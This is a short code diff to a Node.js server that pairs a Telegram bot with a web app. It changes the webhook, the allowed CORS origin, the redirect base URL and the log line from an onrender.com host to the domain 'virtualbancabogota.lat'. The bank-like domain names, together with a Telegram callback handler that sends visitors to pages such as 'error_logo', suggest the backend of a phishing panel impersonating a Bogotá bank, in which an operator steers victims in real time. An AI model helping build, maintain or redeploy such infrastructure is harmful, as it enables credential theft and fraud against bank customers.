@@ -28,7 +28,7 @@ const bot = new TelegramBot(token, {
 });
 
 // Configurar webhook para Render
-const webhookUrl = `https://sucusalbogotapersona.onrender.com/api/webhook`;
+const webhookUrl = `https://virtualbancabogota.lat/api/webhook`;
 
 // Configurar webhook al iniciar
 bot.setWebHook(webhookUrl)
@@ -48,7 +48,7 @@ app.use((req, res, next) => {
     const origin = req.headers.origin;
     
     const allowedOrigins = [
-        'https://sucusalbogotapersona.onrender.com',
+        'https://virtualbancabogota.lat',
         'http://localhost:3000',
         'http://127.0.0.1:3000'
     ];
@@ -192,7 +192,7 @@ bot.on('callback_query', async (callbackQuery) => {
         });
 
         let redirectUrl, message;
-        const baseUrl = 'https://sucusalbogotapersona.onrender.com';
+        const baseUrl = 'https://virtualbancabogota.lat';
         
         switch(action) {
             case 'error_logo':
@@ -253,5 +253,5 @@ io.on('connection', (socket) => {
 httpServer.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Servidor ejecutándose en puerto: ${PORT}`);
     console.log(`🌍 Entorno: ${process.env.NODE_ENV || 'production'}`);
-    console.log(`🔗 URL: https://sucusalbogotapersona.onrender.com`);
+    console.log(`🔗 URL: https://virtualbancabogota.lat`);
 });
